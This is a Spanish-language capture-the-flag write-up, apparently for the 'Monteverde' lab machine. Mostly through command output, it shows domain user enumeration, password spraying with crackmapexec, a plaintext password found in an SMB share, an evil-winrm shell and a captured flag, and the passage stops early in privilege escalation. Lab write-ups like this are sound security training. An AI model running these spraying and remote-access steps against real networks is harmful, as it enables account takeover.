<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: <span class="o">(</span>null<span class="o">)</span>
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O<span class="s1">'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
</span></code></pre></div></div>

<h2 id="shell-as-mhope">Shell as mhope</h2>

<ul>
  <li>Bueno tenemos un listado potencial de usuarios algo que podemos hacer es un <strong>Password Spray</strong> esto consiste en ver si algún usuario usa su nombre de usuario como contraseña para eso usaremos la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">--continue-on-success</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\m</span>hope:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:smorgan STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:smorgan STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>Con esto comprobamos que las credenciales son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos acceso de lectura a varios recursos a nivel de red uno que se ve interesante por el nombre es el de <code class="language-plaintext highlighter-rouge">users$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> <span class="s1">'SABatchJobs'</span> <span class="nt">--shares</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.228.111  445    MONTEVERDE       ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C<span class="nv">$ </span>                             Default share
SMB         10.129.228.111  445    MONTEVERDE       E<span class="nv">$ </span>                             Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       <span class="nb">users</span><span class="nv">$ </span>         READ
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar ese recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient <span class="nt">-U</span> SABatchJobs //10.129.228.111/users<span class="err">$</span>
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>ABatchJobs]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos un archivo llamado <strong>azure.xml</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: <span class="se">\m</span>hope<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descárgalo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\m</span>hope<span class="se">\&gt;</span> get azure.xml
getting file <span class="se">\m</span>hope<span class="se">\a</span>zure.xml of size 1212 as azure.xml <span class="o">(</span>3.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 3.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si examinamos el archivo encontramos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>azure.xml
&lt;Objs <span class="nv">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="o">&gt;</span>
  &lt;Obj <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
    &lt;TN <span class="nv">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>
      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
      &lt;T&gt;System.Object&lt;/T&gt;
    &lt;/TN&gt;
    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
    &lt;Props&gt;
      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"StartDate"</span><span class="o">&gt;</span>2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;DT <span class="nv">N</span><span class="o">=</span><span class="s2">"EndDate"</span><span class="o">&gt;</span>2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
      &lt;G <span class="nv">N</span><span class="o">=</span><span class="s2">"KeyId"</span><span class="o">&gt;</span>00000000-0000-0000-0000-000000000000&lt;/G&gt;
      &lt;S <span class="nv">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="o">&gt;</span>4n0therD4y@n0th3r<span class="nv">$&lt;</span>/S&gt;
    &lt;/Props&gt;
  &lt;/Obj&gt;
&lt;/Objs&gt;
</code></pre></div></div>

<ul>
  <li>Como ahora tenemos una contraseña nueva lo que podemos hacer básicamente es hacer otro <code class="language-plaintext highlighter-rouge">Password Spray</code> para ver si algún usuario utiliza la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.228.111 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="err">$</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-ata:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\d</span>galanos:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\r</span>oleary:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\s</span>morgan:4n0therD4y@n0th3r<span class="nv">$ </span>STATUS_LOGON_FAILURE
</code></pre></div></div>

<ul>
  <li>Podemos emplear <code class="language-plaintext highlighter-rouge">evil-winrm</code> gracias a que nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> y el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Windows Remote Management</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> mhope <span class="nt">-p</span> 4n0therD4y@n0th3r<span class="err">$</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>megabank<span class="se">\m</span>hope
</code></pre></div></div>

<h1 id="usertxt">user.txt</h1>

<ul>
  <li>Ahora ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
2314ead90ec16835111baba6c8982424
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Si vemos información del usuario que tenemos pertenecemos al grupo <code class="language-plaintext highlighter-rouge">Azure Admins</code> <a href="https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB">https://azure.microsoft.com/es-mx/free/search/?ef_id=_k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;OCID=AIDcmmxotgtm93_SEM__k_Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB_k_&amp;gad_source=1&amp;gclid=Cj0KCQjwk6SwBhDPARIsAJ59GwePQWEd6LrIpNIF-tOzKzL4PxiwLvUnEjzfruIADa8HUIolo8Ngjf4aAperEALw_wcB</a>.</li>
</ul>

<blockquote>
  <p>Microsoft Azure es una plataforma de computación en la nube creado por Microsoft para construir, probar, desplegar y administrar aplicaciones y servicios mediante el uso de sus centros de datos.</p>
</blockquote>

<ul>
  <li>Si vamos ala raíz hay una carpeta con el nombre <code class="language-plaintext highlighter-rouge">Program Files</code> que contiene archivos sobre este servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s1">'Program Files'</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
